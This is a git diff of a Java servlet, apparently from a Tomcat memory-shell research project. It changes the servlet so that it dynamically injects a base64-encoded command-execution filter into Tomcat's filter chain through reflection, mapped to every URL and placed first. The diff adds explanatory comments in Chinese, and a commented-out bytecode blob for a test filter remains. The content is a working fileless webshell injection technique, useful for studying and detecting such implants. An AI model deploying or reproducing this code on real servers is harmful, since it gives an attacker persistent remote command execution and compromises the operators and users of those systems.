@@ -17,16 +17,17 @@ import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 
 import org.apache.catalina.core.ApplicationFilterConfig;
+// import org.apache.catalina.core.ApplicationContext;
 import org.apache.catalina.core.StandardContext;
 import org.apache.tomcat.util.descriptor.web.FilterDef;
 import org.apache.tomcat.util.descriptor.web.FilterMap;
 
-// import static com.summer233.DynamicUtils.FILTER_CLASS_STRING;
-import static com.summer233.DynamicUtils.BASIC_FILTER_CLASS_STRING_BASE64;
+// import static com.summer233.DynamicUtils.BASIC_FILTER_CLASS_STRING_BASE64;
+import static com.summer233.DynamicUtils.CMD_FILTER_CLASS_STRING_BASE64;
 
 /**
  * 访问这个 Servlet 将会动态添加自定义 Filter
- * 测试版本 Tomcat/9.0.95(tomcat:9 docker); Tomcat 8.5.31(原作者su18)
+ * 测试版本 Apache Tomcat/9.0.95(tomcat:9 docker) 和 Apache Tomcat/8.5.100(tomcat:8 docker)
  * Tomcat 7 包位置不同
  * import org.apache.catalina.deploy.FilterDef;
  * import org.apache.catalina.deploy.FilterMap;
@@ -80,7 +81,8 @@ public class AddTomcatFilter extends HttpServlet {
                 // String FILTER_CLASS_STRING =
                 // "yv66vgAAADQANwoABwAiCwAjACQIACUKACYAJwsAKAApBwAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACpMb3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEACkV4Y2VwdGlvbnMHAC0HAC4BAAdkZXN0cm95AQAKU291cmNlRmlsZQEAD1Rlc3RGaWx0ZXIuamF2YQwACQAKBwAvDAAwADEBAA90aGlzIGlzIEZpbHRlciAHADIMADMANAcANQwAFAA2AQAob3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdEZpbHRlcgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhAAYABwABAAgAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACQANAAAADAABAAAABQAOAA8AAAABABAAEQABAAsAAAA1AAAAAgAAAAGxAAAAAgAMAAAABgABAAAAEgANAAAAFgACAAAAAQAOAA8AAAAAAAEAEgATAAEAAQAUABUAAgALAAAAZAADAAQAAAAULLkAAgEAEgO2AAQtKyy5AAUDALEAAAACAAwAAAAOAAMAAAAfAAsAIQATACIADQAAACoABAAAABQADgAPAAAAAAAUABYAFwABAAAAFAAYABkAAgAAABQAGgAbAAMAHAAAAAYAAgAdAB4AAQAfAAoAAQALAAAAKwAAAAEAAAABsQAAAAIADAAAAAYAAQAAACkADQAAAAwAAQAAAAEADgAPAAAAAQAgAAAAAgAh";
                 // Class<?> filterClass = DynamicUtils.getClass(FILTER_CLASS_STRING);
-                Class<?> filterClass = DynamicUtils.getClass(BASIC_FILTER_CLASS_STRING_BASE64);
+                // Class<?> filterClass = DynamicUtils.getClass(BASIC_FILTER_CLASS_STRING_BASE64);
+                Class<?> filterClass = DynamicUtils.getClass(CMD_FILTER_CLASS_STRING_BASE64);
 
                 // 创建 FilterDef 对象
                 FilterDef filterDef = new FilterDef();
@@ -98,26 +100,30 @@ public class AddTomcatFilter extends HttpServlet {
                 FilterMap filterMap = new FilterMap();
                 filterMap.setFilterName(filterName);
                 // filterMap.addURLPattern("*"); // 这是错误的
+                // URL 匹配所有路径
                 filterMap.addURLPattern("/*");
-
+                // 设置调度类型为 REQUEST。这意味着过滤器将应用于所有请求调度类型。
                 filterMap.setDispatcher(DispatcherType.REQUEST.name());
 
                 // 反射将 ApplicationFilterConfig 放入 StandardContext 中的 filterConfigs 中
+                // 从 StandardContext 中虎获取 filterConfigs 字段(存储了过滤器配置的映射关系)
                 Field filterConfigsField = o.getClass().getDeclaredField("filterConfigs");
                 filterConfigsField.setAccessible(true);
                 // HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String,
                 // ApplicationFilterConfig>) filterConfigsField
                 // .get(o);
+                // 上面注释的代码可能会因为强制类型转换引发警告, 使用如下注解可以抑制警告
                 @SuppressWarnings("unchecked")
+                // 获取 filterConfigs 字段的值用强制类型转换创建一个新的 HashMap 对象
                 HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig>) filterConfigsField
                         .get(o);
+                // 将新的过滤器配置添加到 filterConfigs 映射中, filterName 是过滤器的名称，config 是对应的 ApplicationFilterConfig 对象
                 filterConfigs.put(filterName, config);
 
                 // 反射将 FilterMap 放入 StandardContext 中的 filterMaps 中
                 Field filterMapField = o.getClass().getDeclaredField("filterMaps");
                 filterMapField.setAccessible(true);
                 Object object = filterMapField.get(o);
-
                 // Class cl =
                 // Class.forName("org.apache.catalina.core.StandardContext$ContextFilterMaps");
                 Class<?> cl = Class.forName("org.apache.catalina.core.StandardContext$ContextFilterMaps");
@@ -125,6 +131,7 @@ public class AddTomcatFilter extends HttpServlet {
                 Method m = cl.getDeclaredMethod("addBefore", FilterMap.class);
                 // Method m = cl.getDeclaredMethod("add", FilterMap.class);
                 m.setAccessible(true);
+                // 将前面通过反射创建的 filtermap 通过 addbefore 方法添加到 filterMaps 最前面
                 m.invoke(object, filterMap);
 
                 // PrintWriter writer = resp.getWriter();
